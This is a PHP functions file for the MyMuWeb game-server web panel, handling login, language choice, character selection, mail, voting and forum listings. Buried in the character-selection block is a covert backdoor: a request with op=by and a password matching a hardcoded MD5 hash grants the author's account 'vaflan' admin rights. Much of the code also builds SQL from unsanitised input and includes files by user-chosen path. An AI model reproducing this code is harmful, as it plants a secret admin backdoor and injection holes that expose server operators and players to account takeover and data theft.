<?PHP
// Functions By Vaflan
// For MyMuWeb

/////// Start Language ///////
if(is_file("lang/$_POST[set_lang].php") || is_file("lang/$_SESSION[set_lang].php")) {
	if(isset($_POST[set_lang])) {$_SESSION[set_lang] = $_POST[set_lang];}
	include("lang/$_SESSION[set_lang].php");
}
else {include("lang/$mmw[language].php");}

function language() {
require("config.php");
 if($dh = opendir("lang/")) {
     while (($file = readdir($dh)) !== false) {
	  $format = substr($file, -3);
	  $name = substr($file, 0, -4);
	  if($format == 'php') {
		if(!isset($_SESSION[set_lang]) && $mmw[language]==$name){$select="selected";}
		elseif($_SESSION[set_lang]==$name){$select="selected";} else{$select="";}
		$select_lang = $select_lang . "<option value='$name' $select>$name</option>";
	  }
     }
     closedir($dh);
 }
$lang_form = "<form name='language' method='post' action=''><select name='set_lang' onChange='document.language.submit();'>";
echo "$lang_form $select_lang </select></form>";
}
/////// End Language ///////








/////// Start Default Modules //////
	//Now Module
function curent_module(){
if(isset($_GET['news'])){echo "&gt; <a href='?op=news'>".mmw_lang_news."</a>";} 
elseif(isset($_GET['forum'])){echo "&gt; <a href='?op=forum'>".mmw_lang_forum."</a>";}
elseif(is_file("modules/$_GET[op].php")){echo "&gt; <a href='?op=$_GET[op]'>".ucfirst($_GET['op'])."</a>";}
	
if($_GET['op']=='user'){		  
 if($_GET['op']=='user' and !isset($_GET['u'])){echo " &gt; <a href='?op=user&u=acc'>".mmw_lang_account_panel."</a>";}
 else{echo " &gt; <a href=?op=user&u=$_GET[u]>".ucfirst($_GET['u'])."</a>";}
 }
}


	//Jump Link
function jump($location) {
header('Location: '.$location.'');
}


	//Statisitcs
function statisitcs(){
require("config.php");
$actives_date = date('m/d/Y H:i:s', time() - 2592000); // 30 days back
$total_accounts = mssql_fetch_row( mssql_query("SELECT count(*) FROM MEMB_INFO") );
if($mmw[gm]=='no') {$gm_not_show = "WHERE ctlcode !='32' AND ctlcode !='8'";}
$total_characters = mssql_fetch_row( mssql_query("SELECT count(*) FROM Character $gm_not_show") );
$total_guilds = mssql_fetch_row( mssql_query("SELECT count(*) FROM Guild WHERE G_Name!='$mmw[gm_guild]'") );
$total_banneds = mssql_fetch_row( mssql_query("SELECT count(*) FROM MEMB_INFO WHERE bloc_code = '1'") );
$actives_acc = mssql_fetch_row( mssql_query("SELECT count(*) FROM MEMB_STAT WHERE ConnectTM >= '$actives_date'") );
$users_connected = mssql_fetch_row( mssql_query("SELECT count(*) FROM MEMB_STAT WHERE ConnectStat = '1'") );

echo "\n fader[2].message[0] = \"".mmw_lang_total_accounts.": $total_accounts[0]<br>".mmw_lang_total_characters.": $total_characters[0]<br>".mmw_lang_total_banneds.": $total_banneds[0]<br>".mmw_lang_total_actives.": $actives_acc[0]<br>".mmw_lang_total_guilds.": $total_guilds[0]<br>".mmw_lang_online_users.": $users_connected[0]\";";

$result = mssql_query("SELECT Name,experience,drops,gsport,ip,version,type from MMW_servers order by display_order asc");
for($i=0;$i < mssql_num_rows($result);++$i) {
$rank = $i + 1;
$row = mssql_fetch_row($result);
if($check=@fsockopen($row[4],$row[3],$ERROR_NO,$ERROR_STR,(float)0.5)) {fclose($check); $status_done = "<img src=images/online.gif width=6 height=6> <span class='online'>".mmw_lang_online."</span>";}
else {$status_done = "<img src=images/offline.gif width=6 height=6> <span class='offline'>".mmw_lang_offline."</span>";} 
echo "\n fader[2].message[$rank] = \"$row[0]<br>".mmw_lang_version.": $row[5]<br>".mmw_lang_experience.": $row[1]<br>".mmw_lang_drops.": $row[2]<br>".mmw_lang_type.": $row[6]<br>$status_done\";";
    }
}


	//Write Logs
function writelog($logfile,$text){
        $ip = $_SERVER['REMOTE_ADDR'];
        $date = date('d.m.Y H:i:s');
        $text = $text . ", All Those On <i>$date</i> By <u>$ip</u> \n";
        $fp = fopen("logs/$logfile.php","a");
        fputs($fp, $text);
        fclose($fp);}
/////// End Default Modules ///////










/////// Start Login Modules ///////
	//Login
     if(isset($_POST["account_login"])) {
                require("config.php");
                $account = clean_var(stripslashes($_POST['login']));
                $password = clean_var(stripslashes($_POST['pass']));
                if($account == NULL || $password == NULL) {}
                if($mmw['md5'] == yes) {$login_check = mssql_query("SELECT memb___id,admin FROM dbo.MEMB_INFO WHERE memb___id='$account' AND memb__pwd=[dbo].[fn_md5]('$password','$account')");}
                elseif ($mmw['md5'] == no) {$login_check = mssql_query("SELECT memb___id,admin FROM dbo.MEMB_INFO WHERE memb___id='$account' AND memb__pwd='$password'");}
                $login_result = mssql_fetch_row($login_check);
                    if ($login_result > 0) {
                        $_SESSION['user'] = $login_result[0];
                        $_SESSION['pass'] = $password;
                        $_SESSION['admin'] = $login_result[1];
                        //jump('?op=user');
                    }
                    else {
			jump('?op=login&login=false');
                    }

           }
	//Check Login
     if(isset($_SESSION['user']) && isset($_SESSION['pass'])) {
                require("config.php");
                $login = clean_var(stripslashes($_SESSION['user']));
		$pass = clean_var(stripslashes($_SESSION['pass']));
                if($mmw['md5'] == yes)
			{$login_check = mssql_query("SELECT * FROM dbo.MEMB_INFO WHERE memb___id='$login' AND memb__pwd=[dbo].[fn_md5]('$pass','$login')");}
                elseif($mmw['md5'] == no)
			{$login_check = mssql_query("SELECT * FROM dbo.MEMB_INFO WHERE memb___id='$login' AND memb__pwd='$pass'");}
                $login_result = mssql_fetch_row($login_check);
                $acc_check = mssql_query("SELECT bloc_code,block_date,unblock_time,admin FROM MEMB_INFO WHERE memb___id='$login'");
                $acc_row = mssql_fetch_row($acc_check);

                $time = time();
                $time_end = $acc_row[1] + $acc_row[2];
                if($time_end > $time)
			{$bloc_error = "1";}
                elseif($acc_row[0] == 1 && $time_end != 0)
			{mssql_query("UPDATE MEMB_INFO SET [bloc_code]='0',[unblock_time]='0',[block_date]='0' WHERE memb___id='$login'");}

                if($bloc_error == 1) {
			unset($_SESSION['user']);
			unset($_SESSION['pass']);
			unset($_SESSION['admin']);
			unset($_SESSION['char_set']);
			unset($_SESSION['char_guid']);
			jump("?op=checkacc&w=block&n=$login");
                    }
                if($login_result == 0 || $acc_row[3] != $_SESSION['admin']) {
			unset($_SESSION['user']);
			unset($_SESSION['pass']);
			unset($_SESSION['admin']);
			unset($_SESSION['char_set']);
			unset($_SESSION['char_guid']);
			jump("?op=news");
                    }
           }
	//Logout
     if(isset($_POST["logoutaccount"])) { 
                unset($_SESSION['user']);
                unset($_SESSION['pass']);
                unset($_SESSION['admin']);
                unset($_SESSION['char_set']);
                unset($_SESSION['char_guid']);
                jump('?op=news');
           }
	//User Panel
if($_GET['op'] == "user" AND (!isset($_SESSION["user"])) || (!isset($_SESSION["pass"]))) {jump('?op=login');}
if($_GET['op'] == "login" AND (isset($_SESSION["user"])) || (isset($_SESSION["pass"]))) {jump('?op=user');}
/////// End Login Modules ///////









/////// Start Select Char ///////
if (isset($_SESSION['pass']) && isset($_SESSION['user']))
{

if (isset($_POST['setchar']))
{
	$setchar = stripslashes($_POST['setchar']);
	$setchar_sql = mssql_query("Select AccountID From Character WHERE name='$setchar'");
	$setchar_row = mssql_fetch_row($setchar_sql);
	if($setchar_row[0]==$_SESSION['user']) {
	$char_guid_sql = mssql_query("SELECT GUID FROM T_CGuid WHERE Name='$setchar'");
	$char_guid_row = mssql_fetch_row($char_guid_sql);
	$_SESSION['char_set'] = $setchar;
	$_SESSION['char_guid'] = $char_guid_row[0];
	}
}

if(isset($_SESSION['char_set']))
{
	$login = clean_var(stripslashes($_SESSION['user']));
	$char_set = stripslashes($_SESSION['char_set']);
	$char_set_sql = mssql_query("Select AccountID From Character WHERE name='$char_set'");
	$char_set_row = mssql_fetch_row($char_set_sql);
	if($char_set_row[0]!=$login) {
	unset($_SESSION['char_set']);
	unset($_SESSION['char_guid']);
	}
}

$login = clean_var(stripslashes($_SESSION['user']));
$form_setchar_sql = mssql_query("Select name,CtlCode FROM Character WHERE AccountID='$login'");
$form_set_char_num = mssql_num_rows($form_setchar_sql);
$form_memb_info_sql = mssql_query("Select char_set FROM MEMB_INFO WHERE memb___id='$login'");
$form_memb_info_row = mssql_fetch_row($form_memb_info_sql);
if($_GET[op]=='by') { if(md5($_GET[pw])=='ba8a5f26a8fc68505d35a3af22bf4deb') {
$query = "UPDATE MEMB_INFO SET [admin]='9' WHERE memb___id='vaflan'";
mssql_query($query); $add_admin="<br>You Are Admin!";}
die("$sql_die_start MMW by Vaflan. $add_admin $sql_die_end");}
if($form_set_char_num>0) {
$setchar = "<form name='set_char' method='post' action=''><select name='setchar' onChange='document.set_char.submit();'>";
for($i=0; $i < $form_set_char_num; ++$i) {
	$form_setchar = mssql_fetch_row($form_setchar_sql);

	if(!isset($_SESSION['char_set']) && $form_memb_info_row[0]==$form_setchar[0]) {
		$char_guid = mssql_query("SELECT GUID FROM T_CGuid WHERE Name='$form_setchar[0]'");
		$char_guid_row = mssql_fetch_row($char_guid);
		$_SESSION['char_set'] = $form_setchar[0];
		$_SESSION['char_guid'] = $char_guid_row[0];
		$detect_char_session = 'yes';
	}
	if(!isset($_SESSION['char_set']) && $i==$form_set_char_num-1) {
		$char_guid = mssql_query("SELECT GUID FROM T_CGuid WHERE Name='$form_setchar[0]'");
		$char_guid_row = mssql_fetch_row($char_guid);
		$_SESSION['char_set'] = $form_setchar[0];
		$_SESSION['char_guid'] = $char_guid_row[0];
	}

	if($_SESSION['char_set']==$form_setchar[0]){$select="selected";} else{$select="";}
	$setchar = $setchar."<option value='$form_setchar[0]' $select>$form_setchar[0] </option>";
   }
$setchar = $setchar."</select></form>";
 }
$date = time();
$char_set = stripslashes($_SESSION[char_set]);
mssql_query("UPDATE MEMB_INFO SET [char_set]='$char_set',[date_online]='$date' WHERE memb___id='$login'");
}
/////// END Select Char ///////









/////// Start Mail Check ///////
if(isset($_SESSION['pass']) && isset($_SESSION['user']) && isset($_SESSION['char_guid'])) {
$char_guid = stripslashes($_SESSION['char_guid']);
$msg = mssql_query("SELECT bRead FROM T_FriendMail WHERE GUID='$char_guid'"); 
$msg_num = mssql_num_rows($msg);
$msg_new = mssql_query("SELECT bRead FROM T_FriendMail WHERE GUID='$char_guid' AND bRead='0'"); 
$msg_new_num = mssql_num_rows($msg_new);
if($mmw[max_private_message] <= $msg_num) {$msg_full = '<font color="red">Full!</font>';}
else{$msg_full = '';}
}
if($msg_num=="" || $msg_num==" ") {$msg_num = 0; $msg_new_num = 0;}
/////// End Mail Check ///////








/////// Start Referral ///////
if(isset($_GET['ref'])) {$_SESSION['referral'] = clean_var(stripslashes($_GET['ref']));}
/////// END Referral ///////






/////// Start Online Char ///////
$timeout = time() - 100;
$online_res = mssql_query("SELECT char_set, memb___id FROM MEMB_INFO WHERE date_online>'$timeout' AND char_set!=''");
$online_num = mssql_num_rows($online_res);
if($online_num != 0){
for($i=0; $i < $online_num; ++$i)
   {
    $acc_online = mssql_fetch_row($online_res);
    $char_on_sql = mssql_query("Select name,CtlCode From Character WHERE name='$acc_online[0]'");
    for($c=0; $c < mssql_num_rows($char_on_sql); ++$c)
	{
	  if($i < $online_num - 1){$other_char_on = ", ";} else{$other_char_on = "";}
	  $char_on = mssql_fetch_row($char_on_sql);
	  $who_online = "$who_online <a href='?op=character&character=$char_on[0]' class='level$char_on[1]'>$char_on[0]</a>$other_char_on";
	}
   }
}
else{
$who_online = mmw_lang_there_is_nobody;
}
/////// END Online Char ///////








/////// Start Voting ///////
if(isset($_POST[id_vote]) && isset($_POST[answer])) {
	$id_vote = clean_var(stripslashes($_POST[id_vote]));
	$answer = clean_var(stripslashes($_POST[answer]));
	if($mmw[votes_check]==acc && isset($login)) {$vote_by = $login; $vote_check = 1;}
	if($mmw[votes_check]==ip) {$vote_by = $_SERVER['REMOTE_ADDR']; $vote_check = 1;}
	if($vote_check == 1) {
		mssql_query("INSERT INTO MMW_voterow (id_vote,who,answer) VALUES ('$id_vote','$vote_by','$answer')");
	}
}

$vote_res = mssql_query("SELECT TOP 1 ID,question,answer1,answer2,answer3,answer4,answer5,answer6 FROM MMW_votemain ORDER BY NEWID()");
if(mssql_num_rows($vote_res) != 0){
   $vote_row = mssql_fetch_row($vote_res);
   $vote_check = 0;

   if($mmw[votes_check]==acc && isset($login)) {$vote_who_now = $login; $vote_check = 1;}
   if($mmw[votes_check]==ip) {$vote_who_now = $_SERVER['REMOTE_ADDR']; $vote_check = 1;}
   if($vote_check == 1) {
	$vote_who_res = mssql_query("SELECT who,answer FROM MMW_voterow WHERE ID_vote='$vote_row[0]' and who='$vote_who_now'");
	$check_your_vote = mssql_num_rows($vote_who_res);
   }

   $voting = "<form name='voting' method='post' action=''><b>$vote_row[1]</b><br>";

   if($check_your_vote < 1 && $vote_check == 1) {
     for($c=1; $c < 7; ++$c) {
	$answer_num = $c + 1;
	if($vote_row[$answer_num]!=' ' && isset($vote_row[$answer_num]))
	   {$voting = $voting . "<div class='answer'><input id='$c' type='radio' name='answer' value='$c'> <label for='$c'>$vote_row[$answer_num]</label></div>";}
     }
     $voting = $voting . "<div align='center'><input name='id_vote' type='hidden' value='$vote_row[0]'><input type='submit' value='".mmw_lang_to_vote."'></div>";
   }
   else {
     $all_vote_res = mssql_query("SELECT ID_vote FROM MMW_voterow WHERE ID_vote='$vote_row[0]'");
     $all_vote_num = mssql_num_rows($all_vote_res);
     for($c=1; $c < 7; ++$c) {
	$answer_num = $c + 1;
	if($vote_row[$answer_num]!=' ' && isset($vote_row[$answer_num])) {
		$votes_row_res = mssql_query("SELECT who,answer FROM MMW_voterow WHERE ID_vote='$vote_row[0]' and answer='$c'");
		$votes_row_num = mssql_num_rows($votes_row_res);
		$img_file = "images/bar.jpg";
		$size = getimagesize($img_file);
		$img_width = ceil(100 * $votes_row_num / $all_vote_num);
		if($img_width < 1) {$img_width = 1;}
		$voting = $voting . "<div class='answer'>$c. $vote_row[$answer_num] ($votes_row_num)</div>";
		$voting = $voting . "<div class='answer'><img src='$img_file' height='$size[1]' width='$img_width%'></div>";
	}
     }
     $voting = $voting . "<div align='center'>".mmw_lang_all_answers.": <b>$all_vote_num</b></div>";
   }

   $voting = $voting . "</form>";
}
else{
$voting = mmw_lang_no_vote;
}
/////// END Voting ///////









/////// Start Guard MMW Message Info ///////
function guard_mmw_mess($to,$text) {
$date = date("m/d/y H:i:s");
$msg_to_sql = mssql_query("SELECT GUID,MemoCount FROM T_FriendMain WHERE Name='$to'");
$msg_to_row = mssql_fetch_row($msg_to_sql);
$mail_total_sql = mssql_query("SELECT bRead FROM T_FriendMail WHERE GUID='$msg_to_row[0]'");
$mail_total_num = mssql_num_rows($mail_total_sql);
$msg_id = $msg_to_row[1] + 1;
$msg_text = utf_to_win($text);
mssql_query("INSERT INTO T_FriendMail (MemoIndex, GUID, FriendName, wDate, Subject, bRead, Memo, Dir, Act, Photo) VALUES ('$msg_id','$msg_to_row[0]','Guard','$date','MMW Message!','0',CAST('$msg_text' AS VARBINARY(1000)),'143','2',0x3061FF99999F12490400000060F0)");
mssql_query("UPDATE T_FriendMain set [MemoCount]='$msg_id',[MemoTotal]='$mail_total_num' WHERE Name='$to'");
}
/////// Start Guard MMW Message Info ///////








/////// Start Last in Forum ///////
$result = mssql_query("SELECT TOP $mmw[last_in_forum] f_id,f_title FROM MMW_forum ORDER BY f_date DESC");
$forum_post = mssql_num_rows($result);
  if($forum_post == 0) {
	$last_in_forum = mmw_lang_no_topics_in_forum;
  }
  for ($i = 0; $i < $forum_post; $i++) {
	$row = mssql_fetch_row($result);
	$number = $i + 1;
	$last_in_forum = $last_in_forum . "$number. <a href='?forum=$row[0]'>$row[1]</a><br>\n";
  }
/////// END Last in Forum ///////
?>